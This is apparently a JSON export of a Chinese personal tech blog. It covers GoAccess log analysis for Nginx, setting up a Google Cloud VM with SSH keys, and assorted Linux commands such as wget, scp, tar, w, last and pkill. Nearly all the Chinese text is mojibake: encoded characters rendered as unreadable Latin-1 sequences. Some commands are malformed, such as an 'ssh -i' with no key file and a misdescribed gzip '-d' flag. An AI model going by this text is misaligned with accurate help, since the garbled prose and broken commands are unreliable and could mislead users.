Gç§»åŠ¨åˆ°å±å¹•çš„æœ€åä¸€é¡¹æˆ–åº•éƒ¨ é™æ€HTML è¾“å‡ºä»¥ä¸‹å†…å®¹åˆ†æè®¿é—®æ—¥å¿—å¹¶åœ¨é™æ€HTMLæŠ¥å‘Šä¸­æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯ã€‚ 1$ goaccess -a -d -f nginx&#x2F;access.log.1 -p ~&#x2F;.goaccessrc -o &#x2F;var&#x2F;www&#x2F;report.html å®æ—¶HTML è¾“å‡º1$ goaccess -a -d -f nginx&#x2F;access.log.1 -p ~&#x2F;.goaccessrc -o &#x2F;var&#x2F;www&#x2F;report.html --real-time-html ç„¶åç”¨æµè§ˆå™¨è®¿é—®ï¼Œå¤§æ¦‚å°±æ˜¯è¿™ä¸ªæ ·å­ï¼š é…ç½®æ–‡ä»¶åŠæ—¥å¿—æ ¼å¼è¯´æ˜GoAccess çš„é…ç½®æ–‡ä»¶ä½äº%sysconfdir%/goaccess.confæˆ–~/.goaccessrc å…¶ä¸­ï¼Œ%sysconfdir%æ˜¯ /etc/ï¼Œ/usr/etc/ æˆ– /usr/local/etc/ time-formatå’Œdate-formatçš„æ ¼å¼é€šå¸¸éƒ½æ˜¯å›ºå®šçš„ï¼Œåªæœ‰log-formatçš„æ ¼å¼è§†å…·ä½“æ—¥å¿—æ ¼å¼è€Œå®šã€‚ 123time-format %Tdate-format %d&#x2F;%b&#x2F;%Y log-formatå¸¸ç”¨æ ¼å¼è¯´æ˜ï¼š 1234567891011121314151617181920212223* %xä¸æ—¶é—´æ ¼å¼å’Œæ—¥æœŸæ ¼å¼å˜é‡åŒ¹é…çš„æ—¥æœŸå’Œæ—¶é—´å­—æ®µã€‚å½“ç»™å‡ºæ—¶é—´æˆ³è€Œä¸æ˜¯æ—¥æœŸå’Œæ—¶é—´åœ¨ä¸¤ä¸ªå•ç‹¬çš„å˜é‡ä¸­æ—¶ä½¿ç”¨ã€‚* %tæ—¶é—´å­—æ®µåŒ¹é…æ—¶é—´æ ¼å¼å˜é‡ã€‚* %dä¸æ—¥æœŸæ ¼å¼å˜é‡åŒ¹é…çš„æ—¥æœŸå­—æ®µã€‚* %væœåŠ¡å™¨åç§°æ ¹æ®è§„èŒƒåç§°è®¾ç½®ï¼ˆæœåŠ¡å™¨å—æˆ–è™šæ‹Ÿä¸»æœºï¼‰ã€‚* %eè¿™æ˜¯HTTPèº«ä»½éªŒè¯ç¡®å®šçš„è¯·æ±‚æ–‡æ¡£çš„äººçš„ç”¨æˆ·æ ‡è¯†ã€‚* %hhostï¼ˆå®¢æˆ·ç«¯IPåœ°å€ï¼ŒIPv4æˆ–IPv6ï¼‰* %ræ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚è¡Œã€‚è¿™éœ€è¦å›´ç»•è¯·æ±‚çš„ç‰¹å®šåˆ†éš”ç¬¦ï¼ˆå•å¼•å·ï¼ŒåŒå¼•å·ç­‰ï¼‰å¯è§£æã€‚å¦åˆ™ï¼Œä½¿ç”¨ç‰¹æ®Šçš„æ ¼å¼è¯´æ˜ç¬¦ï¼Œå¦‚ç»„åˆ%mï¼Œ%Uï¼Œ%qå’Œ%Hè§£æå„ä¸ªå­—æ®µã€‚æ³¨æ„ï¼šä½¿ç”¨æˆ–è€…%rè·å¾—å®Œæ•´çš„è¯·æ±‚OR %mï¼Œ%Uï¼Œ%qå¹¶%Hå½¢æˆä½ çš„è¦æ±‚ï¼Œä¸è¦åŒæ—¶ä½¿ç”¨ã€‚* %mè¯·æ±‚æ–¹æ³•ã€‚* %Uè¯·æ±‚çš„URLè·¯å¾„ã€‚æ³¨æ„ï¼šå¦‚æœæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨%Uï¼Œåˆ™æ— éœ€ä½¿ç”¨%qã€‚ä½†æ˜¯ï¼Œå¦‚æœURLè·¯å¾„ä¸åŒ…å«ä»»ä½•æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œåˆ™å¯ä»¥ä½¿ç”¨%qå¹¶å°†æŸ¥è¯¢å­—ç¬¦ä¸²é™„åŠ åˆ°è¯·æ±‚ä¸­ã€‚* %qæŸ¥è¯¢å­—ç¬¦ä¸²ã€‚* %Hè¯·æ±‚åè®®ã€‚* %sæœåŠ¡å™¨å‘é€å›å®¢æˆ·ç«¯çš„çŠ¶æ€ä»£ç ã€‚* %bè¿”å›ç»™å®¢æˆ·ç«¯çš„å¯¹è±¡å¤§å°ã€‚* %Râ€œRefererâ€HTTPè¯·æ±‚æ ‡å¤´ã€‚* %uç”¨æˆ·ä»£ç†HTTPè¯·æ±‚æ ‡å¤´ã€‚* %DæœåŠ¡è¯·æ±‚æ‰€éœ€çš„æ—¶é—´ï¼Œä»¥å¾®ç§’ä¸ºå•ä½ã€‚* %TæœåŠ¡è¯·æ±‚æ‰€éœ€çš„æ—¶é—´ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½ï¼Œåˆ†è¾¨ç‡ä¸ºæ¯«ç§’ã€‚* %L æœåŠ¡è¯·æ±‚æ‰€ç”¨çš„æ—¶é—´ï¼Œä»¥æ¯«ç§’ä¸ºå•ä½çš„åè¿›åˆ¶æ•°ã€‚* %^å¿½ç•¥æ­¤å­—æ®µã€‚* %~å‘å‰ç§»åŠ¨æ—¥å¿—å­—ç¬¦ä¸²ï¼Œç›´åˆ°æ‰¾åˆ°éç©ºæ ¼ï¼ˆï¼isspaceï¼‰charã€‚* ~h X-Forwarded-Forï¼ˆXFFï¼‰å­—æ®µä¸­çš„ä¸»æœºï¼ˆå®¢æˆ·ç«¯IPåœ°å€ï¼ŒIPv4æˆ–IPv6ï¼‰ã€‚ å¸¸ç”¨å‚æ•° -fï¼šæŒ‡å®šéœ€è¦åˆ†æçš„æ—¥å¿—æ–‡ä»¶è·¯å¾„ -cï¼šç¨‹åºå¯åŠ¨æ—¶æç¤ºæ—¥å¿—/æ—¥æœŸé…ç½®çª—å£ -pï¼šæŒ‡å®šè¦ä½¿ç”¨çš„è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ -dï¼šåœ¨HTMLæˆ–JSONè¾“å‡ºä¸Šå¯ç”¨IPè§£æå™¨ -oï¼šè¾“å‡ºåˆ°æŒ‡å®šæ‰©å±•åæ–‡ä»¶ä¸­ï¼ˆHtmlã€Jsonã€CSVï¼‰ -aï¼šæŒ‰ä¸»æœºå¯ç”¨ç”¨æˆ·ä»£ç†åˆ—è¡¨ã€‚ä¸ºäº†æ›´å¿«åœ°è§£æï¼Œè¯·ä¸è¦å¯ç”¨æ­¤æ ‡å¿— -dï¼šåœ¨HTMLæˆ–JSONè¾“å‡ºä¸Šå¯ç”¨IPè§£æå™¨ã€‚ æ€»ç»“ï¼šGoAccess ä»å®‰è£…åˆ°ä½¿ç”¨è¿˜æ˜¯éå¸¸æ–¹ä¾¿çš„ï¼Œä¸ä»…å¯ä»¥å¯¹å†å²çš„æ—¥å¿—è¿›è¡Œåˆ†æï¼Œä¹Ÿèƒ½å®æ—¶å¯¹æ—¥å¿—è¿›è¡Œåˆ†æï¼Œæ‰€æ”¯æŒçš„æ—¥å¿—æ ¼å¼åŸºæœ¬èƒ½æ»¡è¶³å¤§å¤šæ•°åº”ç”¨åœºæ™¯ã€‚ å‚è€ƒé“¾æ¥ GoAccess å®˜ç½‘ GoAccess å…¥é—¨ ä½¿ç”¨GoAccess åˆ†æNginx æ—¥å¿— å°†Nginx log_formatè½¬æ¢ä¸ºgoaccessé…ç½®æ–‡ä»¶ GoAccess æ—¥å¿—æ ¼å¼è½¬æ¢æ¡ˆä¾‹ä¸€ GoAccess æ—¥å¿—æ ¼å¼è½¬æ¢æ¡ˆä¾‹äºŒ GoAccess æ—¥å¿—æ ¼å¼è½¬æ¢æ¡ˆä¾‹ä¸‰ GoAccess æ—¥å¿—æ ¼å¼è½¬æ¢æ¡ˆä¾‹å››","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"GoAccess","slug":"GoAccess","permalink":"https://www.0x2beace.com/tags/GoAccess/"},{"name":"Logs","slug":"Logs","permalink":"https://www.0x2beace.com/tags/Logs/"}]},{"title":"æ‰‹æŠŠæ‰‹æ•™ä½ å¦‚ä½•åˆ›å»ºå¯åŠ¨ Google Cloud å®ä¾‹","slug":"teach-you-how-to-create-and-start-a-google-cloud-instance","date":"2020-08-26T15:25:21.000Z","updated":"2020-08-27T06:27:35.489Z","comments":true,"path":"teach-you-how-to-create-and-start-a-google-cloud-instance/","link":"","permalink":"https://www.0x2beace.com/teach-you-how-to-create-and-start-a-google-cloud-instance/","excerpt":"æœ€è¿‘éœ€è¦åœ¨Google Cloud ä¸Šé‡æ–°å¼€ä¸€å°HkåŒºçš„æœåŠ¡å™¨ï¼Œæ‰€ä»¥å†™è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•æ“ä½œè¿‡ç¨‹ã€‚","text":"æœ€è¿‘éœ€è¦åœ¨Google Cloud ä¸Šé‡æ–°å¼€ä¸€å°HkåŒºçš„æœåŠ¡å™¨ï¼Œæ‰€ä»¥å†™è¿™ç¯‡ç¬”è®°ç”¨æ¥è®°å½•æ“ä½œè¿‡ç¨‹ã€‚ åˆ›å»ºVM å®ä¾‹ Google Cloud å®˜ç½‘ Google Cloud Platform æ§åˆ¶å° è¿›å…¥æ§åˆ¶å°ï¼Œæ‰¾åˆ° Compute Engineï¼Œç‚¹å‡»åˆ›å»ºå®ä¾‹ã€‚ æ–°å»ºè™šæ‹Ÿæœºå®ä¾‹ï¼Œé€‰æ‹©ç›¸åº”çš„é…ç½®ã€‚ é€‰æ‹©æ“ä½œç³»ç»Ÿæ˜ åƒï¼Œä»¥åŠç£ç›˜å¤§å°ã€‚ åŸºæœ¬é…ç½®å¦‚ä¸‹ï¼š ç„¶åç‚¹å‡»åˆ›å»ºå°±å¯ä»¥äº†ã€‚åˆ›å»ºæˆåŠŸä¹‹åï¼Œå°±å¯ä»¥çœ‹åˆ°è¯¥æœåŠ¡å™¨çš„IPåœ°å€äº†ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒGoogle Cloud çš„è¿œç¨‹è¿æ¥SSH çš„æ–¹å¼ä¸å…¶ä»–å¹³å°æœ‰æ‰€åŒºåˆ«ã€‚ åˆ›å»ºSSH è¿æ¥Compute Engine =ã€‹å…ƒæ•°æ® =ã€‹SSH å¯†é’¥ æ‰¾åˆ°ä¿®æ”¹ï¼Œç„¶åä¸Šä¼ ä½ çš„ SSH Keyã€‚ ä¸çŸ¥é“SSH Key æ˜¯ä»€ä¹ˆï¼Ÿ 1234$ ssh-keygen -t rsa# æ‰“å¼€ç»ˆç«¯ï¼Œè¾“å…¥ä¸Šé¢é‚£ä¸ªå‘½ä»¤# ç„¶ååœ¨~&#x2F;.ssh ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ª å…¬é’¥å’Œç§é’¥# å°† .pub ç»“å°¾çš„æ–‡ä»¶æ‰“å¼€ï¼Œå¤åˆ¶å…¶ä¸­çš„å€¼ï¼Œç²˜è´´åˆ°Google Cloud ä¸Šå°±å¯ä»¥äº†ã€‚ è¿æ¥ä½¿ç”¨ssh -i max@35.241.77.3 å‘½ä»¤è¿æ¥ï¼Œå…¶ä¸­ max æ˜¯ç”¨æˆ·åï¼Œåé¢æ˜¯å¯¹åº”æœåŠ¡å™¨ ipåœ°å€ã€‚ å‚è€ƒé“¾æ¥ å¼€å¯Linux è™šæ‹Ÿæœºä½¿ç”¨å¿«é€Ÿå…¥é—¨â€“å®˜ç½‘æ–‡æ¡£ GCPï¼ˆGoogle Cloud Platformï¼‰å…¥é—¨","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"},{"name":"Tutorial","slug":"Linux/Tutorial","permalink":"https://www.0x2beace.com/categories/Linux/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"äº‘","slug":"äº‘","permalink":"https://www.0x2beace.com/tags/%E4%BA%91/"}]},{"title":"ä¸å¸¸ç”¨Linuxå‘½ä»¤","slug":"not-commonly-used-linux-commands","date":"2020-08-25T12:53:33.000Z","updated":"2020-08-25T12:54:50.257Z","comments":true,"path":"not-commonly-used-linux-commands/","link":"","permalink":"https://www.0x2beace.com/not-commonly-used-linux-commands/","excerpt":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯è®°å½•é‚£äº›ä¸å¤ªå¸¸ç”¨ä½†å´å¾ˆå®ç”¨çš„ Linux å‘½ä»¤ã€‚","text":"è¿™ç¯‡ç¬”è®°çš„ç›®çš„æ˜¯è®°å½•é‚£äº›ä¸å¤ªå¸¸ç”¨ä½†å´å¾ˆå®ç”¨çš„ Linux å‘½ä»¤ã€‚ Wgetwget å‘½ä»¤ç”¨äºæ–‡ä»¶çš„ä¸‹è½½ï¼Œ ä¸‹è½½å•ä¸ªæ–‡ä»¶123# ä¸‹è½½Ubuntu 18.04 æ¡Œé¢ç‰ˆå’ŒæœåŠ¡ç«¯ç‰ˆ$ wget https:&#x2F;&#x2F;mirror.xtom.com.hk&#x2F;ubuntu-releases&#x2F;18.04.2&#x2F;ubuntu-18.04.2-live-server-amd64.iso$ wget https:&#x2F;&#x2F;mirror.xtom.com.hk&#x2F;ubuntu-releases&#x2F;18.04.2&#x2F;ubuntu-18.04.2-desktop-amd64.iso wgeté»˜è®¤ä¼šä»¥æœ€åä¸€ä¸ªç¬¦åˆâ€/â€çš„åé¢çš„å­—ç¬¦æ¥å‘½ä»¤ï¼Œå¯¹äºåŠ¨æ€é“¾æ¥çš„ä¸‹è½½é€šå¸¸æ–‡ä»¶åä¼šä¸æ­£ç¡®ã€‚ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‚æ•°-Oæ¥æŒ‡å®šä¸€ä¸ªæ–‡ä»¶åï¼š ä¸‹è½½å•ä¸ªæ–‡ä»¶å¹¶é‡å‘½å1$ wget -O file.zip http:&#x2F;&#x2F;www.minjieren.com&#x2F;download.aspx?id&#x3D;1080 åå°ä¸‹è½½å½“éœ€è¦ä¸‹è½½æ¯”è¾ƒå¤§çš„æ–‡ä»¶æ—¶ï¼Œä½¿ç”¨å‚æ•°-bå¯ä»¥éšè—åœ¨åå°è¿›è¡Œä¸‹è½½ï¼š 1$ wget -b http:&#x2F;&#x2F;www.minjieren.com&#x2F;wordpress-3.1-zh_CN.zip å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥å¯Ÿçœ‹ä¸‹è½½è¿›åº¦ï¼š 1$ tail -f wget-log CurlScpscp å‘½ä»¤ç”¨äºæ–‡ä»¶ä¼ è¾“ï¼Œåœ¨ä¸èƒ½ä½¿ç”¨ XShell è¿™ç±»å·¥å…·æ—¶ï¼Œscpèƒ½å¾ˆå¥½çš„è§£å†³æ–‡ä»¶ä¸Šä¼ çš„é—®é¢˜ã€‚ ä¸Šä¼ æ–‡ä»¶1$ scp -r &#x2F;c&#x2F;User&#x2F;Desktop&#x2F;dirname username@34.92.117.222:&#x2F;tmp&#x2F;dirname ä¸‹è½½æ–‡ä»¶1$scp -r Boo@34.92.117.222:&#x2F;tmp&#x2F;dirname &#x2F;c&#x2F;Users&#x2F;Boo&#x2F;Desktop&#x2F;dirname å¦‚æœå­˜åœ¨ç«¯å£å·ï¼š æ³¨æ„ï¼š-På‚æ•°æ˜¯å¤§å†™ã€‚ 1scp -P 58812 root@103.232.86.239:&#x2F;tmp&#x2F;runfast_0603.sql ~&#x2F;File&#x2F; å…¶ä¸­ -r å‚æ•°è¡¨ç¤ºç›®å½•ï¼Œusername è¡¨ç¤ºæœåŠ¡å™¨å¯¹åº”ç”¨æˆ·ï¼Œ@ åé¢æ¥æœåŠ¡å™¨åœ°å€ã€‚ æ³¨æ„ï¼šä¸è¦ç›´æ¥ä½¿ç”¨ root ç”¨æˆ·ï¼Œå› ä¸ºæ€»æ˜¯ä¼šæç¤ºä½ æƒé™ä¸è¶³ã€‚å¦å¤–ä½¿ç”¨é root ç”¨æˆ·æ—¶ï¼Œéœ€è¦æ³¨æ„æ–‡ä»¶å¤¹æƒé™çš„é—®é¢˜ã€‚ zipzip å‘½ä»¤ç”¨äºå¯¹æ–‡ä»¶è¿›è¡Œæ‰“åŒ…å¤„ç†ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„å‹ç¼©ã€‚æ–‡ä»¶ç»å‹ç¼©ä¹‹åä¼šç”Ÿæˆä¸€ä¸ªå…·æœ‰.zipæ‰©å±•åçš„å‹ç¼©æ–‡ä»¶ã€‚ å°†å½“å‰ç›®å½•çš„dirç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠæ–‡ä»¶å¤¹å‹ç¼©ä¸º example.zip 1$ zip -r -q example.zip dir å°†å½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠæ–‡ä»¶å¤¹å‹ç¼©ä¸º example.zip 1$ zip -r -q * å°†æŒ‡å®šæ–‡ä»¶ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶åŠæ–‡ä»¶å¤¹å‹ç¼©ä¸º example.zip 1$ zip -r -q exmaple.zip &#x2F;tmp&#x2F;dir unzipunzip å‘½ä»¤ç”¨äºè§£å‹ç¼©ç”± zip å‘½ä»¤å‹ç¼©çš„â€œ.zipâ€å‹ç¼©åŒ…ã€‚ æŸ¥çœ‹å‹ç¼©æ–‡ä»¶ 1$ unzip -v dir.zip å°†å‹ç¼©æ–‡ä»¶åœ¨å½“å‰ç›®å½•ä¸‹è§£å‹ 1$ unzip example.zip å°†å‹ç¼©æ–‡ä»¶example.zipåœ¨æŒ‡å®šç›®å½•/tmpä¸‹è§£å‹ç¼©ï¼Œå¦‚æœå·²æœ‰ç›¸åŒçš„æ–‡ä»¶å­˜åœ¨ï¼Œè¦æ±‚ unzipå‘½ä»¤ä¸è¦†ç›–åŸå…ˆçš„æ–‡ä»¶ã€‚ 1$ unzip -n example.zip -d &#x2F;tmp å°†å‹ç¼©æ–‡ä»¶example.zipåœ¨å½“å‰ç›®dirä¸‹è§£å‹ï¼Œå¦‚æœå·²æœ‰ç›¸åŒçš„æ–‡ä»¶ï¼Œä¸è¯¢é—®ï¼Œç›´æ¥è¦†ç›–ã€‚ 1$ unzip -o example.zip -d -o å‚æ•°è¡¨ç¤ºä¸å¿…å…ˆè¯¢é—®ç”¨æˆ·ï¼Œunzipæ‰§è¡Œåè¦†ç›–åŸæœ‰çš„æ–‡ä»¶ï¼›-d å‚æ•°æŒ‡å®šæ–‡ä»¶è§£å‹ç¼©åæ‰€è¦å­˜å‚¨çš„ç›®å½•ï¼›-n å‚æ•°è§£å‹ç¼©æ—¶ä¸è¦è¦†ç›–åŸæœ‰çš„æ–‡ä»¶ï¼› tartar å‘½ä»¤å¯ä»¥ä¸ºlinux æ–‡ä»¶å’Œç›®å½•åˆ›å»ºæ¡£æ¡ˆã€‚ åˆ©ç”¨tarå‘½ä»¤ï¼Œå¯ä»¥æŠŠä¸€å¤§å †çš„æ–‡ä»¶å’Œç›®å½•å…¨éƒ¨æ‰“åŒ…æˆä¸€ä¸ªæ–‡ä»¶ã€‚ éœ€è¦æ˜ç¡®çš„ä¸¤ä¸ªæ¦‚å¿µæ˜¯ï¼šæ‰“åŒ…å’Œå‹ç¼©æ˜¯ä¸åŒçš„ä¸¤ä»¶äº‹ã€‚ æ‰“åŒ…ï¼šæ˜¯æŒ‡å°†ä¸€å¤§å †æ–‡ä»¶æˆ–ç›®å½•å˜æˆä¸€ä¸ªæ€»çš„æ–‡ä»¶ï¼› å‹ç¼©ï¼šåˆ™æ˜¯å°†ä¸€ä¸ªå¤§æ–‡ä»¶é€šè¿‡å‹ç¼©ç®—æ³•å˜æˆä¸€ä¸ªå°æ–‡ä»¶ã€‚ ä¸ºä»€ä¹ˆè¦åŒºåˆ†è¿™ä¸¤ä¸ªæ¦‚å¿µå‘¢ï¼Ÿè¿™æºäºLinuxä¸­å¾ˆå¤šå‹ç¼©ç¨‹åºåªèƒ½é’ˆå¯¹ä¸€ä¸ªæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œè¿™æ ·å½“ä½ æƒ³è¦å‹ç¼©ä¸€å¤§å †æ–‡ä»¶æ—¶ï¼Œä½ å¾—å…ˆå°†è¿™ä¸€å¤§å †æ–‡ä»¶å…ˆæ‰“æˆä¸€ä¸ªåŒ…ï¼ˆtarå‘½ä»¤ï¼‰ï¼Œç„¶åå†ç”¨å‹ç¼©ç¨‹åºè¿›è¡Œå‹ç¼©ï¼ˆgzip bzip2å‘½ä»¤ï¼‰ã€‚ æ‰“åŒ…ä»…æ‰“åŒ…ï¼Œä¸å‹ç¼©ã€‚ 1$ tar -cvf test.tar 20200323.log test.tarè¿™ä¸ªæ–‡ä»¶åæ˜¯è‡ªå®šä¹‰çš„ï¼Œåªæ˜¯ä¹ æƒ¯ä¸Šæˆ‘ä»¬ä½¿ç”¨.tarä½œä¸ºåŒ…æ–‡ä»¶ã€‚ æ‰“åŒ…å¹¶å‹ç¼©æ‰“åŒ…ï¼Œä¸”å‹ç¼©ã€‚-zå‚æ•°è¡¨ç¤ºä»¥.tar.gzæˆ–è€….tgzåç¼€åä»£è¡¨gzipå‹ç¼©è¿‡çš„taråŒ…ã€‚ 1$ tar -zcvf test.tar.gz 20200323.log æ‰“åŒ…ï¼Œä¸”å‹ç¼©ã€‚-jå‚æ•°è¡¨ç¤ºä»¥.tar.bz2åç¼€åä½œä¸ºtaråŒ…åã€‚ 1$ tar -jcvf test.tar.bz2 20200323.log æŸ¥çœ‹åŒ…å†…å®¹1$ tar -ztvf test.tar.gz å› ä¸ºä½¿ç”¨gzipå‘½ä»¤å‹ç¼©çš„test.tar.gzï¼Œæ‰€ä»¥æŸ¥çœ‹å‹ç¼©åŒ…æ—¶éœ€è¦åŠ ä¸Š-zå‚æ•°ã€‚ å¦‚ä½•åªè§£å‹éƒ¨åˆ†æ–‡ä»¶ï¼Ÿ 1$ tar -ztvf test.tar.gz 20200323.log è¿™ç§æ–¹å¼ä»…é™äºå–ä¸€ä¸ªæ–‡ä»¶ã€‚ è§£å‹åœ¨è¯¥ç›®å½•ä¸‹ç›´æ¥è§£å‹ï¼š 1$ tar -zxvf test.tar.gz è§£å‹è‡³æŒ‡å®šæ–‡ä»¶å¤¹ï¼š 123$ tar -zxvf test.tar.gz -C log$ ls log20200323.log gzip.gzå‹ç¼©åŒ…ï¼ˆä¸å¸¦tarï¼‰ï¼Œéœ€è¦ä½¿ç”¨gzip å‘½ä»¤å»è§£å‹ã€‚ 1gzip test.gz -d &#x2F;&lt;filename&gt; -d å‚æ•°ç”¨äºæŒ‡å®šè§£å‹ä½ç½® æ‚é¡¹å¦‚ä½•æŸ¥çœ‹Linux çš„å‘è¡Œç‰ˆæœ¬ï¼Ÿ 1$ lsb_release -a crontabcrontab å‘½ä»¤è¢«ç”¨æ¥æäº¤å’Œç®¡ç†ç”¨æˆ·çš„éœ€è¦å‘¨æœŸæ€§æ‰§è¡Œçš„ä»»åŠ¡ï¼Œä¸windowsä¸‹çš„è®¡åˆ’ä»»åŠ¡ç±»ä¼¼ã€‚ wwå‘½ä»¤ç”¨äºæ˜¾ç¤ºå·²ç»ç™»é™†ç³»ç»Ÿçš„ç”¨æˆ·åˆ—è¡¨ï¼Œå¹¶æ˜¾ç¤ºç”¨æˆ·æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤ã€‚ ä¸å¸¦ä»»ä½•å‚æ•°ï¼Œä¼šæ˜¾ç¤ºå½“å‰ç™»å…¥ç³»ç»Ÿçš„æ‰€æœ‰ç”¨æˆ· 12345$ w 10:54:39 up 14 days, 22:39, 2 users, load average: 0.18, 0.09, 0.08USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATwangyh pts&#x2F;0 113.87.129.118 10:27 25:10 2.77s 2.76s topBoo pts&#x2F;1 113.87.129.118 10:54 1.00s 0.00s 0.00s w ç¬¬ä¸€è¡Œæ˜¾ç¤ºçš„å­—æ®µä¿¡æ¯åˆ†åˆ«æ˜¯ï¼š 10:50:39ï¼šç³»ç»Ÿå½“å‰æ—¶é—´ up 2:02ï¼š ç³»ç»Ÿå·²è¿è¡Œæ—¶é—´ 2 userï¼šå½“å‰åœ¨çº¿ç”¨æˆ·ä¸ªæ•° load averageï¼šç³»ç»Ÿçš„å¹³å‡è´Ÿè½½ï¼Œ3ä¸ªæ•°å€¼åˆ†åˆ«å¯¹åº”ç³»ç»Ÿåœ¨è¿‡å»çš„1,5,10åˆ†é’Ÿå†…çš„è´Ÿè½½ç¨‹åº¦ï¼Œæ•°å€¼è¶Šå¤§ï¼Œè¡¨æ˜ç³»ç»Ÿçš„è´Ÿè½½è¶Šå¤§ã€‚ ç¬¬äºŒè¡Œå‡ ä¸ªå­—æ®µåˆ†åˆ«è¡¨ç¤ºï¼š USER ï¼š ç™»é™†ç”¨æˆ·çš„è´¦æˆ·å TTYï¼š ç”¨æˆ·ç™»é™†æ‰€ä½¿ç”¨çš„ç»ˆç«¯ FROMï¼š æ˜¾ç¤ºç”¨æˆ·ä»ä½•å¤„ç™»é™†ï¼Œç”¨æˆ·çš„IPåœ°å€ LOGIN@ï¼šæ˜¾ç¤ºç”¨æˆ·ç™»é™†å…¥ç³»ç»Ÿæ—¶çš„æ—¶é—´ IDLEï¼šç”¨æˆ·ç©ºé—²æ—¶é•¿ï¼Œä»ä¸Šä¸€æ¬¡è¯¥ç”¨æˆ·çš„ä»»åŠ¡ç»“æŸåå¼€å§‹è®¡æ—¶ï¼Œä»¥hourä¸ºå•ä½ JCPUï¼šè¡¨ç¤ºåœ¨æŸæ®µæ—¶é—´å†…ï¼Œå½“å‰ç”¨æˆ·æ‰€æœ‰çš„è¿›ç¨‹ä»»åŠ¡æ‰€æ¶ˆè€—çš„CPUæ—¶é—´ PCPUï¼šè¡¨ç¤ºåœ¨æŸæ®µæ—¶é—´å†…ï¼Œå½“å‰ç”¨æˆ·æ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹ä»»åŠ¡æ‰€æ¶ˆè€—çš„CPUæ—¶é—´ WHATï¼šè¡¨ç¤ºç”¨æˆ·æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡ whowho å‘½ä»¤ç”¨äºæŸ¥çœ‹ç›®å‰ç™»å…¥ç³»ç»Ÿçš„ç”¨æˆ·ä¿¡æ¯ï¼Œä¸wå‘½ä»¤ç±»ä¼¼ã€‚ æ˜¾ç¤ºå½“å‰ç™»å…¥ç³»ç»Ÿä¸­çš„æ‰€æœ‰ç”¨æˆ·ä¿¡æ¯ 123$ whowangyh pts&#x2F;0 2019-04-19 10:27 (113.87.129.118)Boo pts&#x2F;1 2019-04-19 10:54 (113.87.129.118) å¸¸ç”¨å‚æ•°-mï¼šæ•ˆæœç­‰åŒäºæ‰§è¡Œwhoamiå‘½ä»¤-qæˆ–--countï¼šåªæ˜¾ç¤ºç™»å…¥ç³»ç»Ÿçš„å¸å·åç§°å’Œæ€»äººæ•°ï¼›-Hï¼šå¢åŠ æ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯çŠ¶æ€æ  lastlast å‘½ä»¤ç”¨äºæŸ¥çœ‹ç”¨æˆ·æœ€è¿‘çš„ç™»å…¥ä¿¡æ¯ è¾“å‡ºæœ€å10 æ¡ç™»å…¥ä¿¡æ¯ 1234$ last -3Boo pts&#x2F;1 113.87.129.118 Fri Apr 19 10:54 still logged inwangyh pts&#x2F;0 113.87.129.118 Fri Apr 19 10:27 still logged inwangyh pts&#x2F;5 113.87.129.118 Fri Apr 19 10:24 - 10:27 (00:02) æŸ¥çœ‹æŒ‡å®šç”¨æˆ·çš„ç™»å…¥ä¿¡æ¯ 1234$ last Boo -3Boo pts&#x2F;1 113.87.129.118 Fri Apr 19 10:54 still logged inBoo pts&#x2F;4 113.87.129.118 Fri Apr 19 10:23 - 10:26 (00:03)Boo pts&#x2F;4 113.87.129.118 Fri Apr 19 10:14 - 10:22 (00:08) pkillpkillå‘½ä»¤å¯ä»¥æŒ‰ç…§è¿›ç¨‹åæ€æ­»è¿›ç¨‹ï¼Œå¯ä»¥ç”¨äºè¸¢å‡ºå½“å‰ç™»å…¥ç³»ç»Ÿçš„ç”¨æˆ·ã€‚ å®‰å…¨çš„è¸¢å‡ºç”¨æˆ·å¯ä»¥ä½¿ç”¨pkillå‘½ä»¤è¸¢å‡ºå½“å‰æ­£ç™»å…¥ç³»ç»Ÿä¸­çš„ç”¨æˆ·ï¼Œä½†æ˜¯è¿™ä¹ˆåšå¾ˆå±é™©ï¼Œæ›´å¥½çš„è§£å†³åŠæ³•æ˜¯ï¼šå…ˆæŸ¥çœ‹ç»ˆç«¯å·ï¼Œç„¶åæŸ¥çœ‹è¯¥ç»ˆç«¯æ‰§è¡Œçš„æ‰€æœ‰è¿›ç¨‹ï¼Œæ ¹æ®è¿›ç¨‹å·æ¥åœæ­¢æœåŠ¡ã€‚ 12$ ps -ef| grep pts&#x2F;0$ kill -9 pid passwdpasswd å‘½ä»¤ç”¨äºè®¾ç½®ç”¨æˆ·çš„è®¤è¯ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·å¯†ç ã€å¯†ç è¿‡æœŸæ—¶é—´ç­‰ã€‚ 